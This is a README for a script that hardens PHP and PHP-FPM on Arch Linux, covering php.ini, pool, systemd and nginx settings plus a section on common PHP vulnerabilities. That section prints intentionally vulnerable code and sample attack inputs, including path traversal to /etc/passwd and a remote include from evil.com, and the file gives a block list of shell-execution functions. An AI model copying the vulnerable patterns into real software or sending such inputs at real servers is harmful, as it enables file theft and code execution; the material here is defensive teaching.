# PHP Production Hardening

Installs and hardens [PHP](https://www.php.net/) with [PHP-FPM](https://www.php.net/manual/en/install.fpm.php) for production on Arch Linux, including secure php.ini settings, hardened FPM pool configuration, systemd sandboxing, and optional nginx FastCGI integration.

## Quick Start

```bash
sudo ./php.sh
```

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `--with-fpm` | Enable PHP-FPM hardening | enabled |
| `--no-fpm` | Disable PHP-FPM hardening | |
| `--with-nginx` | Create nginx FastCGI configuration snippet | off |
| `--pool-user USER` | PHP-FPM pool user | `http` |
| `-v VERSION` | PHP version hint (informational; pacman installs current) | |
| `-h` | Show help | |

### Examples

```bash
# Default: harden PHP + FPM
sudo ./php.sh

# Also create nginx FastCGI config
sudo ./php.sh --with-nginx

# Custom pool user with nginx
sudo ./php.sh --with-nginx --pool-user www-data

# Harden php.ini only, skip FPM
sudo ./php.sh --no-fpm
```

## What It Does

### 1. Package Installation

- `php` (core interpreter)
- `php-fpm` (FastCGI Process Manager)
- `php-gd` (image processing)
- `php-intl` (internationalization)
- `php-sodium` (modern cryptography)

Packages that are not found in the repositories are skipped gracefully.

### 2. php.ini Hardening

The script backs up the original `php.ini` before modifying it.

#### Error Handling (Production)

| Directive | Value | Purpose |
|-----------|-------|---------|
| `expose_php` | `Off` | Hide PHP version from HTTP headers |
| `display_errors` | `Off` | Never show errors to users |
| `display_startup_errors` | `Off` | Never show startup errors to users |
| `log_errors` | `On` | Log all errors to file |
| `error_log` | `/var/log/php/error.log` | Centralized error log |
| `error_reporting` | `E_ALL & ~E_DEPRECATED & ~E_STRICT` | Report all meaningful errors |

#### Security

| Directive | Value | Purpose |
|-----------|-------|---------|
| `disable_functions` | `exec,passthru,shell_exec,system,...` | Block dangerous functions (see [Customizing disable_functions](#customizing-disable_functions)) |
| `allow_url_fopen` | `Off` | Prevent remote file inclusion (RFI) |
| `allow_url_include` | `Off` | Prevent remote file inclusion (RFI) |
| `open_basedir` | `/var/www:/tmp:/usr/share/php` | Restrict filesystem access |
| `cgi.fix_pathinfo` | `0` | Prevent CGI path traversal |

#### Session Security

| Directive | Value | Purpose |
|-----------|-------|---------|
| `session.cookie_httponly` | `1` | Prevent JavaScript access to session cookies |
| `session.cookie_secure` | `1` | Send cookies only over HTTPS |
| `session.use_strict_mode` | `1` | Reject uninitialized session IDs |
| `session.cookie_samesite` | `Strict` | Prevent CSRF via cross-site requests |
| `session.use_only_cookies` | `1` | Disable session ID in URL |
| `session.name` | `__Secure-PHPSESSID` | Cookie prefix signals secure context |
| `session.sid_length` | `48` | Long session IDs (more entropy) |
| `session.sid_bits_per_character` | `6` | Maximize entropy density |

#### Resource Limits

| Directive | Value | Purpose |
|-----------|-------|---------|
| `max_execution_time` | `30` | Kill scripts after 30 seconds |
| `max_input_time` | `30` | Limit input parsing time |
| `memory_limit` | `256M` | Prevent memory exhaustion |
| `post_max_size` | `10M` | Limit POST body size |
| `upload_max_filesize` | `10M` | Limit file upload size |
| `max_file_uploads` | `5` | Limit simultaneous uploads |
| `max_input_vars` | `1000` | Prevent hash collision DoS |
| `max_input_nesting_level` | `64` | Prevent deeply nested input abuse |

#### Session Storage

| Directive | Value | Purpose |
|-----------|-------|---------|
| `session.save_handler` | `files` | File-based sessions |
| `session.save_path` | `/var/lib/php/sessions` | Dedicated session directory |
| `session.gc_maxlifetime` | `1440` | Session expires after 24 minutes of inactivity |

### 3. PHP-FPM Pool Configuration

| Setting | Value | Purpose |
|---------|-------|---------|
| `user` / `group` | `POOL_USER` | Run workers as unprivileged user |
| `listen` | `/run/php-fpm/php-fpm.sock` | Unix socket (no TCP exposure) |
| `listen.mode` | `0660` | Only socket owner/group can connect |
| `pm` | `dynamic` | Adjusts workers based on demand |
| `pm.max_children` | `25` | Maximum concurrent workers |
| `pm.start_servers` | `5` | Workers started at boot |
| `pm.min_spare_servers` | `2` | Minimum idle workers |
| `pm.max_spare_servers` | `10` | Maximum idle workers |
| `pm.max_requests` | `500` | Recycle workers to prevent memory leaks |
| `request_terminate_timeout` | `60` | Kill hung requests |
| `rlimit_files` | `1024` | File descriptor limit per worker |
| `rlimit_core` | `0` | No core dumps (prevent info leakage) |
| `security.limit_extensions` | `.php` | Only execute `.php` files |
| `clear_env` | `yes` | Clean environment for workers |
| `php_admin_value[open_basedir]` | `/var/www:/tmp` | Cannot be overridden by application |
| `php_admin_flag[allow_url_fopen]` | `off` | Cannot be overridden by application |

### 4. systemd Service Hardening

| Setting | Value | Purpose |
|---------|-------|---------|
| `ProtectSystem` | `strict` | Read-only filesystem except explicit paths |
| `ProtectHome` | `yes` | No access to `/home`, `/root`, `/run/user` |
| `PrivateTmp` | `yes` | Isolated `/tmp` namespace |
| `PrivateDevices` | `yes` | No access to physical devices |
| `NoNewPrivileges` | `yes` | Cannot escalate privileges |
| `ProtectKernelTunables` | `yes` | No writes to `/proc/sys`, `/sys` |
| `ProtectKernelModules` | `yes` | Cannot load kernel modules |
| `ProtectKernelLogs` | `yes` | No access to kernel log buffer |
| `ProtectControlGroups` | `yes` | Read-only cgroup filesystem |
| `RestrictAddressFamilies` | `AF_UNIX AF_INET AF_INET6` | No raw sockets, no netlink |
| `RestrictNamespaces` | `yes` | Cannot create new namespaces |
| `RestrictRealtime` | `yes` | No realtime scheduling |
| `RestrictSUIDSGID` | `yes` | Cannot create SUID/SGID files |
| `MemoryDenyWriteExecute` | `no` | Required for OPcache JIT compilation |
| `LockPersonality` | `yes` | Cannot change execution domain |
| `SystemCallFilter` | `@system-service @network-io` | Allowlist of permitted syscalls |
| `SystemCallArchitectures` | `native` | No 32-bit compat syscalls |
| `CapabilityBoundingSet` | `CAP_SETUID CAP_SETGID CAP_NET_BIND_SERVICE` | Minimal capabilities for FPM |
| `ReadWritePaths` | `/var/log/php /var/lib/php /run/php-fpm /var/www` | Only directories FPM needs to write |

### 5. nginx FastCGI Integration (--with-nginx)

- FastCGI pass to PHP-FPM Unix socket
- `SCRIPT_FILENAME` parameter set correctly
- `X-Powered-By` header hidden via `fastcgi_hide_header`
- `open_basedir` reinforced via `PHP_VALUE` parameter
- Sample security rules: deny PHP execution in upload directories, block dotfiles

### 6. Log Rotation

Daily rotation of `/var/log/php/*.log` with 14-day retention, compression, and automatic PHP-FPM reload after rotation.

## Generated Files

| Path | Description |
|------|-------------|
| `/etc/php/php.ini` | Hardened PHP configuration |
| `/etc/php/php.ini.bak.*` | Backup of original php.ini |
| `/etc/php/php-fpm.d/www.conf` | Hardened FPM pool |
| `/etc/systemd/system/php-fpm.service.d/hardening.conf` | systemd security override |
| `/etc/nginx/conf.d/php-fpm.conf` | nginx FastCGI config (if `--with-nginx`) |
| `/etc/nginx/conf.d/php-security.conf.sample` | nginx PHP security rules (if `--with-nginx`) |
| `/etc/logrotate.d/php` | Log rotation config |
| `/var/log/php/` | Error log, FPM access log, slow log |
| `/var/lib/php/sessions/` | PHP session storage |

## Customizing disable_functions

The default `disable_functions` list blocks all functions that can execute system commands or expose sensitive information. Different PHP frameworks require some of these functions to operate.

### Laravel

Laravel's Artisan CLI needs `proc_open` and `proc_get_status`. Composer also requires `proc_open`:

```ini
; Remove proc_open from the list for Laravel
disable_functions = exec,passthru,shell_exec,system,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,highlight_file,phpinfo
```

### WordPress

WordPress and some plugins use `exec` for image manipulation (ImageMagick), and `shell_exec` for WP-CLI:

```ini
; Minimal list for WordPress
disable_functions = passthru,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,highlight_file
```

### Symfony

Similar to Laravel, Symfony's Console component needs `proc_open`:

```ini
; Remove proc_open for Symfony
disable_functions = exec,passthru,shell_exec,system,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,highlight_file,phpinfo
```

### Drupal

Drupal core is relatively conservative but some modules may need `exec`:

```ini
; Relaxed list for Drupal
disable_functions = passthru,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,highlight_file,phpinfo
```

### Testing the impact

After modifying `disable_functions`, restart PHP-FPM and test your application:

```bash
sudo systemctl restart php-fpm
# Run your application's test suite or smoke tests
```

## Customizing open_basedir Per Application

The global `open_basedir` in php.ini is a baseline. For multi-site setups, override it per FPM pool or per nginx vhost.

### Per FPM Pool

Create a separate pool file for each application in `/etc/php/php-fpm.d/`:

```ini
; /etc/php/php-fpm.d/myapp.conf
[myapp]
user = myappuser
group = myappuser
listen = /run/php-fpm/myapp.sock

; Application-specific basedir
php_admin_value[open_basedir] = /var/www/myapp:/tmp:/usr/share/php
php_admin_value[upload_tmp_dir] = /var/www/myapp/tmp
php_admin_value[session.save_path] = /var/lib/php/sessions/myapp
```

### Per nginx vhost

Override `open_basedir` in the FastCGI parameters:

```nginx
location ~ \.php$ {
    fastcgi_pass unix:/run/php-fpm/myapp.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_param PHP_VALUE "open_basedir=/var/www/myapp:/tmp";
    include fastcgi_params;
}
```

## PHP OPcache Configuration

OPcache is built into PHP and dramatically improves performance by caching compiled bytecode. The hardening script does not modify OPcache settings, as they are application-specific. Here are production recommendations.

### Recommended Settings

Add these to `/etc/php/conf.d/opcache.ini` or `/etc/php/php.ini`:

```ini
; --- Enable OPcache ---
opcache.enable = 1
opcache.enable_cli = 0

; --- Memory ---
opcache.memory_consumption = 128        ; MB of shared memory for bytecode cache
opcache.interned_strings_buffer = 16    ; MB for interned strings
opcache.max_accelerated_files = 10000   ; Max cached scripts (use prime number >= file count)

; --- Validation ---
; In production, disable timestamp validation for maximum performance.
; You MUST restart PHP-FPM after every deployment to pick up code changes.
opcache.validate_timestamps = 0

; In staging/development, enable validation:
; opcache.validate_timestamps = 1
; opcache.revalidate_freq = 2           ; Check every 2 seconds

; --- JIT (PHP 8.0+) ---
; The JIT compiler can significantly improve CPU-bound workloads.
; For typical web applications, the tracing JIT is recommended.
opcache.jit = tracing
opcache.jit_buffer_size = 64M

; --- Security ---
opcache.save_comments = 1               ; Required by many frameworks (annotations)
opcache.file_cache = ""                 ; Disable file-based cache (shared memory only)
opcache.file_cache_only = 0

; --- Preloading (PHP 7.4+) ---
; Preload frequently used classes into OPcache at FPM start.
; opcache.preload = /var/www/myapp/preload.php
; opcache.preload_user = http
```

### Deployment Workflow with OPcache

When `opcache.validate_timestamps = 0`, PHP-FPM must be restarted after every deployment:

```bash
# Deploy new code
rsync -avz --delete /deploy/myapp/ /var/www/myapp/

# Clear OPcache and restart FPM
sudo systemctl restart php-fpm
```

### Why MemoryDenyWriteExecute = no

The systemd hardening sets `MemoryDenyWriteExecute=no` because OPcache's JIT compiler (PHP 8.0+) needs to generate and execute machine code at runtime. If you do not use the JIT (`opcache.jit = off`), you can set `MemoryDenyWriteExecute=yes` for stronger protection:

```ini
# /etc/systemd/system/php-fpm.service.d/hardening.conf
[Service]
MemoryDenyWriteExecute=yes
```

## Common PHP Security Vulnerabilities

### Type Juggling

PHP's loose comparison (`==`) produces surprising results that attackers exploit for authentication bypass:

```php
// VULNERABLE: loose comparison
if ($_POST['token'] == $storedToken) { /* bypass possible */ }

// "0" == false  => true
// "0e123" == "0e456" => true (both are treated as 0 in scientific notation)
// "1" == true  => true

// SAFE: strict comparison
if ($_POST['token'] === $storedToken) { /* safe */ }

// SAFE: hash_equals for timing-safe comparison of secrets
if (hash_equals($storedToken, $_POST['token'])) { /* timing-safe */ }
```

**Mitigations:**
- Always use `===` (strict comparison) instead of `==`
- Use `hash_equals()` for comparing secrets (prevents timing attacks)
- Enable `strict_types` in every PHP file: `declare(strict_types=1);`

### Insecure Deserialization

`unserialize()` can instantiate arbitrary objects, leading to Remote Code Execution (RCE) via gadget chains:

```php
// VULNERABLE: never unserialize user input
$data = unserialize($_COOKIE['session_data']);

// SAFE: use JSON for data interchange
$data = json_decode($_COOKIE['session_data'], true);

// SAFE: if you must use unserialize, restrict allowed classes
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]);
```

**Mitigations:**
- Never call `unserialize()` on user-controlled input
- Use `json_encode()` / `json_decode()` instead
- If `unserialize()` is unavoidable, use the `allowed_classes` option (PHP 7.0+)
- Audit dependencies for `__wakeup()`, `__destruct()`, and `__toString()` gadgets

### Local File Inclusion (LFI) / Remote File Inclusion (RFI)

LFI allows attackers to read arbitrary files; RFI allows loading remote code:

```php
// VULNERABLE: user input directly in include
include $_GET['page'] . '.php';
// Attacker: ?page=../../../../etc/passwd%00
// Attacker: ?page=http://evil.com/shell

// SAFE: whitelist approach
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';
if (in_array($page, $allowed, true)) {
    include __DIR__ . "/pages/{$page}.php";
} else {
    http_response_code(404);
    include __DIR__ . '/pages/404.php';
}
```

**Mitigations:**
- `allow_url_include = Off` (set by this script) prevents RFI
- `open_basedir` (set by this script) restricts filesystem access
- Never use user input directly in `include`, `require`, `include_once`, `require_once`
- Use a whitelist of allowed pages/templates
- Use an autoloader (Composer PSR-4) instead of manual includes

### SQL Injection

```php
// VULNERABLE: string concatenation
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = $db->query($query);

// SAFE: prepared statements (PDO)
$stmt = $db->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);
$user = $stmt->fetch();

// SAFE: prepared statements (MySQLi)
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

**Mitigations:**
- Always use prepared statements with parameterized queries
- Use PDO with `PDO::ATTR_EMULATE_PREPARES => false`
- Set `PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION`
- Use an ORM (Eloquent, Doctrine) which uses prepared statements internally
- Apply the principle of least privilege to database users

### Cross-Site Scripting (XSS)

```php
// VULNERABLE: raw output
echo "Hello, " . $_GET['name'];

// SAFE: escape output
echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES | ENT_HTML5, 'UTF-8');

// SAFE: use a template engine with auto-escaping (Twig, Blade)
// Twig: {{ name }} auto-escapes by default
// Blade: {{ $name }} auto-escapes by default
```

**Mitigations:**
- Always escape output with `htmlspecialchars()` (or use a template engine with auto-escaping)
- Set `Content-Security-Policy` headers (done by the nginx hardening script)
- Use `session.cookie_httponly = 1` (set by this script) to prevent cookie theft
- Use `session.cookie_samesite = Strict` (set by this script)

## Integration with nginx and Let's Encrypt

For a complete production stack, run the PHP hardening script together with the nginx hardening script from this repository:

```bash
# 1. Harden nginx with SSL (from the nginx hardening directory)
cd ../nginx
sudo ./nginx.sh -d example.com -e admin@example.com

# 2. Harden PHP with nginx integration
cd ../php
sudo ./php.sh --with-nginx

# 3. Add PHP handling to your nginx server block
# Edit /etc/nginx/sites-enabled/default.conf and add:
```

```nginx
# Inside the HTTPS server block, add PHP handling:
location ~ \.php$ {
    try_files $uri =404;
    include conf.d/php-fpm.conf;
}

# Deny PHP in uploads
location ~* /(?:uploads|media)/.*\.php$ {
    deny all;
    return 403;
}
```

```bash
# 4. Test and reload
sudo nginx -t && sudo systemctl reload nginx
```

### Let's Encrypt with PHP applications

If your PHP application has its own routing (e.g., Laravel, WordPress), make sure the ACME challenge location is defined before the PHP catch-all:

```nginx
# ACME challenge (before PHP handler)
location /.well-known/acme-challenge/ {
    root /var/www/html;
    allow all;
}

# PHP handler (after ACME)
location ~ \.php$ {
    try_files $uri =404;
    include conf.d/php-fpm.conf;
}
```

## Monitoring PHP-FPM

### Status Page

The pool is configured with `pm.status_path = /fpm-status`. To access it, add a location block in your nginx config (restrict to localhost or trusted IPs):

```nginx
location = /fpm-status {
    allow 127.0.0.1;
    allow ::1;
    deny all;
    fastcgi_pass unix:/run/php-fpm/php-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
}

location = /fpm-ping {
    allow 127.0.0.1;
    allow ::1;
    deny all;
    fastcgi_pass unix:/run/php-fpm/php-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
}
```

```bash
# Check FPM status
curl http://localhost/fpm-status
curl http://localhost/fpm-status?full
curl http://localhost/fpm-status?json

# Health check
curl http://localhost/fpm-ping
# Expected response: pong
```

### Slow Log

The slow log captures requests that exceed `request_slowlog_timeout` (5 seconds), including a full stack trace:

```bash
# Watch for slow requests in real time
tail -f /var/log/php/fpm-slow.log

# Count slow requests per script
awk '/\[pool www\]/ {getline; print}' /var/log/php/fpm-slow.log | sort | uniq -c | sort -rn
```

### journald

```bash
# FPM service logs
journalctl -u php-fpm -f

# PHP error log
tail -f /var/log/php/error.log

# FPM access log
tail -f /var/log/php/fpm-access.log
```

### Prometheus / Grafana

For production monitoring, export PHP-FPM metrics to Prometheus using [php-fpm_exporter](https://github.com/hipages/php-fpm_exporter):

```bash
# Install the exporter
pacman -S go
go install github.com/hipages/php-fpm_exporter@latest

# Run with the status URL
php-fpm_exporter server --phpfpm.scrape-uri "unix:///run/php-fpm/php-fpm.sock;/fpm-status"
```

## References

- [PHP Security Best Practices](https://www.php.net/manual/en/security.php)
- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
- [PHP-FPM Configuration](https://www.php.net/manual/en/install.fpm.configuration.php)
- [PHP OPcache](https://www.php.net/manual/en/book.opcache.php)
- [PHP Session Security](https://www.php.net/manual/en/session.security.php)
- [CIS PHP Benchmark](https://www.cisecurity.org/benchmark/php)
- [systemd exec sandboxing](https://www.freedesktop.org/software/systemd/man/systemd.exec.html)
- [nginx FastCGI configuration](https://nginx.org/en/docs/http/ngx_http_fastcgi_module.html)
- [PHP Type Juggling Vulnerabilities](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
- [PHP Deserialization Attacks](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [php-fpm_exporter (Prometheus)](https://github.com/hipages/php-fpm_exporter)
- [Arch Wiki — PHP](https://wiki.archlinux.org/title/PHP)
